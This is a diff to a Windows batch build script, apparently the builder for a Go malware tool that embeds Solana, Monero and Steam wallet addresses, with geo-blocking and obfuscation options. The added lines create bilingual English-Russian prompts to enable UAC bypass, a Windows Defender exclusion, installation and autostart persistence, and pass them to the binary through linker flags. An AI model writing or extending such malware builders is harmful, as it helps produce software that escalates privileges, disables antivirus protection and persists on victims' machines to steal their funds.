@@ -51,6 +51,31 @@ echo.
 echo    _ __ _   _ _ __   __ _
 echo   ^| '__^| ^| ^| ^| '_ \ / _` ^|
 echo   ^| ^|  ^| ^|_^| ^| ^| ^| ^| (_^| ^|
+echo   ^|_^|   \__,_^|_^| ^|_^ \__,_^| builder
+echo.
+
+set /p "ENABLE_INSTALL=Enable installation / Включить установку (y/n) [y]: "
+if "!ENABLE_INSTALL!"=="" set "ENABLE_INSTALL=y"
+if /i "!ENABLE_INSTALL!"=="y" (set "INSTALL_FLAG=true") else (set "INSTALL_FLAG=false")
+
+set /p "ENABLE_UAC=Enable UAC bypass / Включить обход UAC (y/n) [y]: "
+if "!ENABLE_UAC!"=="" set "ENABLE_UAC=y"
+if /i "!ENABLE_UAC!"=="y" (set "UAC_FLAG=true") else (set "UAC_FLAG=false")
+
+set /p "ENABLE_DEFENDER=Enable Defender exclusion / Включить исключение из Defender (y/n) [y]: "
+if "!ENABLE_DEFENDER!"=="" set "ENABLE_DEFENDER=y"
+if /i "!ENABLE_DEFENDER!"=="y" (set "DEFENDER_FLAG=true") else (set "DEFENDER_FLAG=false")
+
+set /p "ENABLE_AUTOSTART=Enable autostart / Включить автозагрузку (y/n) [y]: "
+if "!ENABLE_AUTOSTART!"=="" set "ENABLE_AUTOSTART=y"
+if /i "!ENABLE_AUTOSTART!"=="y" (set "AUTOSTART_FLAG=true") else (set "AUTOSTART_FLAG=false")
+
+cls
+
+echo.
+echo    _ __ _   _ _ __   __ _
+echo   ^| '__^| ^| ^| ^| '_ \ / _` ^|
+echo   ^| ^|  ^| ^|_^| ^| ^| ^| ^| (_^| ^|
 echo   ^|_^|   \__,_^|_^| ^|_^ \__,_^| building...
 echo.
 
@@ -66,6 +91,11 @@ set "LDFLAGS=%LDFLAGS% -X main.SolAddr=%SOL%"
 set "LDFLAGS=%LDFLAGS% -X main.XmrAddr=%XMR%"
 set "LDFLAGS=%LDFLAGS% -X main.SteamAddr=%STEAM%"
 
+set "LDFLAGS=%LDFLAGS% -X main.enable_install=%INSTALL_FLAG%"
+set "LDFLAGS=%LDFLAGS% -X main.enable_uac_bypass=%UAC_FLAG%"
+set "LDFLAGS=%LDFLAGS% -X main.enable_defender_excluder=%DEFENDER_FLAG%"
+set "LDFLAGS=%LDFLAGS% -X main.enable_autostart=%AUTOSTART_FLAG%"
+
 if defined GEO_BLOCK (
     set "GEO_BLOCK_CLEAN=!GEO_BLOCK!"
     set "GEO_BLOCK_CLEAN=!GEO_BLOCK_CLEAN:"=!"
@@ -75,6 +105,7 @@ if defined GEO_BLOCK (
         set "LDFLAGS=!LDFLAGS! -X main.blockedGeos=!GEO_BLOCK_CLEAN!"
     )
 )
+
 
 set /p "OBF=Use hard obfuscation / Использовать сильную обфускацию? (y/n): "
 
